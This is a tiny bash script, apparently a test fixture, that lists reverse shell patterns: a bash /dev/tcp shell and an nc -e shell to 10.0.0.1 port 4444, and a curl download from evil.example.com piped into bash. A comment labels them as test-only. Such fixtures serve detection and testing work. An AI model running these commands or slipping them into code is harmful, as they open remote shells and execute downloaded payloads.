#!/bin/bash
# Test file: reverse shell patterns (NOT a real reverse shell, for testing only)
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
nc -e /bin/sh 10.0.0.1 4444
curl http://evil.example.com/payload.txt | bash
